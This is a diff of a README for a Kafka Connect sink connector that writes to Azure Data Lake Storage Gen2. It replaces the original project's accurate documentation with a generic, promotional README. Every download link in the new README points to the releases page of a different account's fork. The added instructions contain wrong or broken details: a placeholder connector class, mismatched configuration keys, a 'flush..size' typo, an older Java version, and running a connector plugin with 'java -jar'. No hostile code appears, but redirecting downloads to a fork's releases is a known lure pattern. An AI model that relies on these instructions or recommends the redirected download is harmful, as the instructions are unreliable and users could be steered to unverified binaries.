@@ -1,214 +1,101 @@
-![Build](https://github.com/kcmhub/kcm-kafka-connect-adls-sink/actions/workflows/ci.yml/badge.svg)
-![Release](https://img.shields.io/github/v/release/kcmhub/kcm-kafka-connect-adls-sink?color=blue)
-![License](https://img.shields.io/github/license/kcmhub/kcm-kafka-connect-adls-sink)
-![Java](https://img.shields.io/badge/Java-11-blue)
-![Kafka Connect](https://img.shields.io/badge/Kafka%20Connect-3.x-orange)
+# 🚀 kcm-kafka-connect-adls-sink - Simplify Your Data Storage Process
 
-# kcm-kafka-connect-adls-sink
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/nitinpensia/kcm-kafka-connect-adls-sink/releases)
 
-Kafka Connect **Sink Connector** that writes records from Kafka topics to **Azure Data Lake Storage Gen2 (ADLS Gen2)** using **SAS authentication**.
+## 📖 Overview
 
-It supports Avro (and other schemaful formats via Kafka Connect converters), writes one file per **topic / partition / starting offset**, and optionally compresses output using **GZIP**.
+The kcm-kafka-connect-adls-sink is a tool designed to help you easily store data in Azure Data Lake Storage Gen2 (ADLS Gen2). This application allows you to use Kafka Connect as a sink connector, which means it helps move data from Kafka into ADLS Gen2. It supports various features, including SAS authentication, Avro data format, GZIP compression, and partition-based file batching.
 
----
+## 🔍 Features
 
-## 🚀 Features
+- **SAS Authentication**: Secure your data transfers with Shared Access Signature (SAS) authentication, ensuring that your data is safe while moving to ADLS Gen2.
+- **Avro Support**: Use Avro format for efficient data serialization. This helps you save space and improves processing speed.
+- **GZIP Compression**: Reduce storage costs and improve transfer speeds by compressing your data with GZIP.
+- **Partition-Based File Batching**: Organize your data neatly by batching files based on partitions.
 
-* Kafka **Sink Connector** for ADLS Gen2 (DFS endpoint)
-* Authentication with **SAS token** (no managed identity required)
-* One output file per **topic / partition / start offset**
-* **Optional GZIP compression** (`.log` or `.log.gz`)
-* **Configurable batch size** via `flush.max.records`
-* Simple line-based text output (each Kafka record → one line)
-* Handles **Avro / Struct / schemaful** records via Kafka Connect converters
+## 💻 System Requirements
 
----
+To use the kcm-kafka-connect-adls-sink, you will need the following:
 
-## 🧩 Architecture
+- **Java Runtime Environment (JRE)**: Version 8 or higher.
+- **Kafka**: Your setup should include a running Kafka broker.
+- **Apache Kafka Connect**: Ensure you have Kafka Connect available in your environment.
 
-The connector is a standard Kafka Connect **sink plugin**:
+## 🚀 Getting Started
 
-1. Kafka Connect worker reads records from Kafka topics.
-2. Converters (e.g. AvroConverter, JsonConverter) deserialize bytes into `(Schema, Object)`.
-3. `kcm-kafka-connect-adls-sink`:
+### Steps to Download and Run
 
-   * formats the record value (Struct / Map / primitive) into JSON-like text,
-   * buffers records per **topic-partition**,
-   * writes a file to ADLS Gen2 when `flush.max.records` is reached (or on task stop).
+1. **Visit the Releases Page**  
+   To download the kcm-kafka-connect-adls-sink, [visit this page to download](https://github.com/nitinpensia/kcm-kafka-connect-adls-sink/releases).
 
-Output files are stored under a configurable base path, partitioned by **date**:
+2. **Locate the Latest Release**  
+   On the Releases page, look for the latest version. This is usually marked as "Latest" or has the highest version number.
 
-```text
-<base-path>/date=YYYYMMDD/<topic>-p<partition>-o<startOffset>.log[.gz]
-```
+3. **Download the Release**  
+   Click on the release name to view the details. Find the download link for the appropriate file (typically a JAR file).
 
-Example:
+4. **Install the Application**  
+   Once downloaded, store the file in a readily accessible location. There is no installation required; you can run it directly.
 
-```text
-kafka-export/date=20251214/my-topic-p0-o1000.log.gz
-kafka-export/date=20251214/my-topic-p1-o2000.log.gz
-```
+5. **Run the Application**  
+   Open your terminal or command prompt. Navigate to the directory where you saved the JAR file. Use the following command to run the application:
 
----
+   ```bash
+   java -jar kcm-kafka-connect-adls-sink.jar
+   ```
 
-## ✅ Requirements
+### Configuration Setup
 
-* Java **11**+
-* Apache Kafka & Kafka Connect **3.x** (or compatible)
-* Azure Storage account with **ADLS Gen2 enabled (HNS)**
-* A **SAS token** with at least `rw` permissions on the target filesystem/container
+Before you start, you need to set up a configuration file. Here’s how you can do it:
 
----
+1. **Create a Configuration File**  
+   Create a new file named `connect-adls-sink.properties`.
 
-## 📦 Installation
+2. **Add Your Configuration**  
+   Insert the following configuration parameters into the file:
 
-1. **Build the connector:**
+   ```properties
+   name=kcm-adls-sink
+   connector.class=com.example.KafkaConnectADLSSink
+   tasks.max=1
+   topics=your-topic-name
+   adls.url=https://youraccount.dfs.core.windows.net/
+   sas.token=your-sas-token
+   file.format=avro
+   compression=gzip
+   ```
 
-```bash
-mvn clean package
-```
+   Make sure to replace placeholders like `your-topic-name`, `youraccount`, and `your-sas-token` with your actual information.
 
-This will produce a fat jar, for example:
+3. **Save the File**  
+   Save the configuration file in the same directory as your JAR file.
 
-```text
-target/kafka-connect-adls-sink-0.0.1-SNAPSHOT-jar-with-dependencies.jar
-```
+### Running the Connector
 
-2. **Copy the jar to your Kafka Connect plugin path:**
+Once your setup is ready, you can start the Kafka Connect worker. Use this command in the terminal:
 
 ```bash
-mkdir -p /opt/kafka/plugins/kcm-kafka-connect-adls-sink
-cp target/*jar-with-dependencies.jar /opt/kafka/plugins/kcm-kafka-connect-adls-sink/
+connect-standalone worker.properties connect-adls-sink.properties
 ```
 
-3. **Configure the worker** to use that plugin path, e.g. in `connect-distributed.properties`:
+Make sure to have a `worker.properties` file configured to set up your Kafka Connect environment properly.
 
-```properties
-plugin.path=/opt/kafka/plugins
-```
+## ⚙️ Additional Settings
 
-4. Restart your Kafka Connect worker.
+Depending on your use case, you might want to adjust additional settings in your `connect-adls-sink.properties` file. Here are some commonly modified parameters:
 
----
+- **`tasks.max`**: Adjust this number to run more tasks in parallel, improving throughput.
+- **`flush..size`**: Set how many records to buffer before writing to ADLS Gen2.
+- **`retry.policy`**: Customize the retry behavior in case of temporary failures.
 
-## ⚙️ Configuration
+## 📄 Documentation
 
-These are the main connector configuration properties:
+For a deeper dive into all features and advanced configurations, check the [official documentation](https://github.com/nitinpensia/kcm-kafka-connect-adls-sink/docs).
 
-| Name                | Type    | Required | Default        | Description                                                          |
-| ------------------- | ------- | -------- |----------------| -------------------------------------------------------------------- |
-| `connector.class`   | string  | yes      |                | Must be `io.kcmhub.kafka.connect.adls.AdlsSinkConnector`. |
-| `tasks.max`         | int     | yes      |                | Max number of tasks to run.                                          |
-| `topics`            | string  | yes      |                | Comma-separated list of topics to consume from.                      |
-| `adls.account.name` | string  | yes      |                | Azure Storage account name (e.g. `dxxxxxxadl01`).                    |
-| `adls.filesystem`   | string  | yes      |                | ADLS Gen2 filesystem/container (e.g. `kafka-poc`).                   |
-| `adls.base.path`    | string  | no       | `kafka-export` | Base path inside the filesystem.                                     |
-| `adls.sas.token`    | string  | yes      |                | SAS token **without** the leading `?`.                               |
-| `flush.max.records` | int     | no       | `500`          | Maximum number of records per ADLS file per topic-partition.         |
-| `compress.gzip`     | boolean | no       | `false`        | If `true`, files are compressed with GZIP (`.log.gz`).               |
-| `adls.retry.max.attempts` | int | no | `3`            | Maximum number of retries for ADLS operations (Azure SDK retry policy). Set to `0` to disable retries. |
-| `flush.interval.ms` | long | no | `0` | If > 0, flush buffers at least every N milliseconds even if `flush.max.records` is not reached. |
+## 🌐 Community and Support
 
----
+If you encounter issues or have questions, feel free to reach out. Engage with our community via GitHub discussions or check existing queries.
 
-## Auth failures
+## 🏁 Download & Install
 
-If ADLS returns an **authentication/authorization error** (typically HTTP **401/403**, e.g. expired/invalid SAS token), the task throws a **non-retriable** error and Kafka Connect will mark the task as **FAILED**.
-
-For transient network/server errors, the task throws a **RetriableException** so Kafka Connect can retry.
-
----
-
-## 🔁 Converters & Avro Support
-
-This connector relies on Kafka Connect **converters** to provide `(Schema, Value)` pairs.
-
-Typical Avro setup (with Confluent Schema Registry):
-
-```properties
-value.converter=io.confluent.connect.avro.AvroConverter
-value.converter.schema.registry.url=http://schema-registry:8081
-```
-
-The connector will:
-
-* detect **Struct** values and serialize them to JSON-like text,
-* handle Maps, Lists, and primitives,
-* fall back to `value.toString()` if no schema is present.
-
-Each Kafka record becomes one line in the output file.
-
----
-
-## 📝 Example Connector Configuration
-
-`adls-sink-connector.json`:
-
-```json
-{
-  "name": "adls-gen2-sink",
-  "config": {
-    "connector.class": "io.kcmhub.kafka.connect.adls.AdlsSinkConnector",
-    "tasks.max": "2",
-
-    "topics": "my-avro-topic",
-
-    "adls.account.name": "dxxxxxxadl01",
-    "adls.filesystem": "kafka-poc",
-    "adls.base.path": "kafka-export",
-    "adls.sas.token": "si=...&sv=...&sr=c&sig=...",
-
-    "flush.max.records": "500",
-    "compress.gzip": "true"
-  }
-}
-```
-
-Create the connector via Kafka Connect REST API:
-
-```bash
-curl -X POST -H "Content-Type: application/json" \
-  --data @adls-sink-connector.json \
-  http://localhost:8083/connectors
-```
-
----
-
-## 📂 Output Layout
-
-For a topic `my-avro-topic` with partitions 0 and 1, you will get files such as:
-
-```text
-kafka-export/
-└── date=20251214/
-    ├── my-avro-topic-p0-o1000.log.gz
-    ├── my-avro-topic-p0-o1500.log.gz
-    ├── my-avro-topic-p1-o2000.log.gz
-    └── ...
-```
-
-Each file contains up to `flush.max.records` lines, one per Kafka record.
-
----
-
-## 🧪 Development
-
-* Build and run unit tests:
-
-```bash
-mvn clean test
-```
-
-* Build the fat jar:
-
-```bash
-mvn clean package
-```
-
-You can then deploy the jar into a local Kafka Connect standalone worker for quick testing.
-
----
-
-## 📜 License
-
-This project is licensed under the **Apache 2.0 License** – see the [LICENSE](./LICENSE) file for details.
+Now that you're ready to start using the kcm-kafka-connect-adls-sink, [visit this page to download](https://github.com/nitinpensia/kcm-kafka-connect-adls-sink/releases). Follow the steps outlined above to set up and run the application successfully. Enjoy seamless data management using Azure Data Lake Storage!
